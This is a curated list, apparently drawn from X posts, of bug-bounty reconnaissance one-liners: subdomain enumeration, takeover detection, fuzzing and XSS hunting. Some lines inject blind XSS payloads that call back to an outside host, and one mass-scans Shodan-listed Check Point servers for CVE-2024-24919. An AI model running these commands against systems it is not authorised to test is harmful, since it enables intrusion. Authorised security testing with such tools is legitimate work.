# X 语料 · 残余回收（信息收集命令）

来源：X 公开贴子。本轮对「非技术」桶做二次精确扫描
这些贴子含可直接执行或可直接套用的骨架（命令行 / 载荷 / 请求头 / 绕过变体），
此前按转贴、重复或「无实质」归档。回收后归入技术语料。仅纯文本，图片与外部媒体已剥离。
作者自述，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[资产发现](../asset-discovery.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-recon-1（253 条）、x-exp-recon（214 条）、x-recovered-recon（83 条） · 本文 83 行

- Recon() {
  subfinder -d $1 >> hosts | assetfinder -subs-only $1 >> hosts | amass enum -norecursive -noalts -d $1 >> hosts | subjack -w hosts -t 100 -timeout 30 -ssl -c ~/subjack/fingerprints.json -v 3 >> takeover
  }
- Subrecon() {
  subfinder -nW -silent -t 25 -d $1 | shuffledns -silent -d $1 -r $RESOLVER | wildcheck -t 100 | awk '{print $3}' | dnsprobe -t 350 -f domain
  }
- Subdomain takeover automation:
  subfinder -dL domains.txt -o subdomains.txt && subjack -w subdomains.txt |toslack
  Run it daily via cron; a VM is recommended.
- Test a wordlist through several hosts:
  ffuf -u https://HFUZZ/WFUZZ -w hosts.txt:HFUZZ -w wordlist.txt:WFUZZ -mode clusterbomb
- Probe for subdomains used in CSP headers with the csp-probe flag in httpx.
  httpx — https://github.com/projectdiscovery/httpx
- Get the other ~2300 domains in scope:
  amass intel -d http://redbull.com -whois
- echo "http://testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe
  https://github.com/KathanP19/Gxss
- Check whether Amass API keys work in your config:
  amass enum -list -config $PATH/toyourconfig.ini
- How to inject blind xss payloads in parameter value/name & headers with scant3r
  $ waybackurls http://target.com | ./scant3r.py -m blind -b http://ex.xss.ht
  https://github.com/knassar702/scant3r/wiki/Find-Blind-XSS-with-scant3r
- Unknown recon Method via http://box.com
  waybackurls $TARGET.app.box.com
  or just use google DORK :
  site:http://box.com "$TARGET"
  Employees sometimes publish sensitive files publicly on box.com.
- Find open redirect with gf:
  echo "https://learn.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
- Fingerprinting with Shodan and Nuclei engine:
  shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /home/ofjaaah/PENTESTER/nuclei-templates/
- DOM XSS through eventListeners in js
  cat hosts | getJS | httpx --match-regex "addEventListener\\((?:'|\")message(?:'|\")"
  https://github.com/yavolo/nuclei-templates/blob/main/addeventlistener-message.yaml
- A useful one-liner to quickly get subdomains of a DOMAIN:
  curl -s http://dns.bufferover.run/dns?q=.DOMAIN. |jq -r .FDNS_A[]|cut -d',' -f2|sort -u
- An accessible .htaccess file can expose the target's internal IPs:
  cat all_ip's.txt | httpx | tee live_ip's.txt
  Then run custom templates:
  cat live_ips.txt | nuclei -t ~/custom_templates
- Oneliner waybackurls validator
  waybackurls http://yahoo.com | grep "url" | xargs -n 1 curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" | sort
- Find the main non-cloud ASN's for a target using shodan CLI:
  shodan stats --facets asn hostname:target,com org:%target%
  Using the org:%target% with the main word from your target means that you don't include ASNs from the likes of Amazon, Akamai, etc.
- Scan for s3 bucket takeover vulnerabilities
  > subfinder -d http://hackerone.com -silent | httpx -silent | gospider -d 5 --sitemap --robots -w -r --subs | grep "\[aws-s3" | sed 's/\[aws-s3\] - //g' | httpx -silent -mr "NoSuchBucket" | tee s3-bucket-takeover txt
- Ffuf for parameter guessing:
  ffuf -u "https://target\.com/payment.php?FUZZ=regular" -w ~/wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt
- XSS Hunting from WaybackURLS by @gudetama_bf
  waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls-xss.txt | sort -u -o urls-xss.txt && cat urls-xss.txt | kxss
- Param Mining
  echo "target" | gau | sort -u | xargs -P 1 -I {} sh -c 'echo "param mining => {}" && arjun -u "{}" -m HEADERS'
  echo "target" | gau | sort -u | xargs -P 1 -I {} sh -c 'echo "param mining => {}" && arjun -u "{}" -m POST'
- CVE-2024-24919
  - shodan search --fields ip_str,port,org "Server: Check Point SVN" "X-UA-Compatible: IE=EmulateIE7" > search.txt
  - awk '{print $1}' search.txt > results.txt
  - nuclei -l results.txt -t CVE-2024-24919.yaml
  https://github.com/johnk3r/nuclei-templates/blob/main/http/cves/2024/CVE-2024-24919.yaml
- One-liner to find JavaScript files quickly using multiple tools:
  echo target\.com | (gau || hakrawler || gospider || katana) | grep -iE '.js'| grep -iEv '(.jsp|.json)' | anew js.txt
- The options I like to use when getting alive subdomains:
  cat domains.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -sc -cl -title -t 100 -fr -nc | anew alive.txt
- JS Recon : WaybackURLs & HTTPX
  waybackurls url | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xargs -I{} python lazyegg[.]py "{}" --js_urls --domains --ips > urls && cat urls | grep '\.' | sort -u | xargs -I{} httpx -silent -u {} -sc -title -td
- Command to extract IPs related to a domain using Shodan
  shodan search http://Ssl.cert.subject.CN:"http://target.com" --fields ip_str | anew ips.txt
- Subdomain Takeover Detection with Subfinder & Nuclei
  -new wordpress takeover detection for nuclei template
  subfinder -d target -o target && nuclei -t wp-xyz-takeover[.]yaml -l target
  https://github.com/schooldropout1337/nuclei-templates/blob/main/wp-xyz-takeover.yaml
- Subdomain Discovery + Live Check
  For subdomain discovery with live check:
  subfinder -d http://target.com | httpx -silent -mc 200
